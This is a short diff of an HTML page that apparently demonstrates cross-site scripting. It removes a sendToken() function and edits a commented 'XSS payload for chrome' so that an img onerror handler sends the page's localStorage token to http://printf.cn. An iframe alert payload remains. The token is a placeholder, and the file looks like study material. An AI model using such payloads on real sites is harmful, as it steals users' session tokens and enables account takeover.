@@ -29,28 +29,13 @@
 		})
 
 		localStorage.setItem("token","thisistoken");
-
-		function sendToken(){
-			console.log(document.cookie);
-			var img=new Image();
-			img.src='http://a.com?token='+ localStorage.getItem("token");
-
-			// img.onerror=function(){
-			//  alert('error');
-			// }
-			
-			// img.onload=function(){
-			//  alert('success');
-			// }
-			
-		}
 	</script>
 
 
 <!-- 
 		XSS payload for chrome:
 		
-		<img/src=x onerror=sendToken()>
+		<img/src=x onerror="(new Image()).src = 'http://printf.cn?token='+ localStorage.getItem('token')">
 
 		<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
 
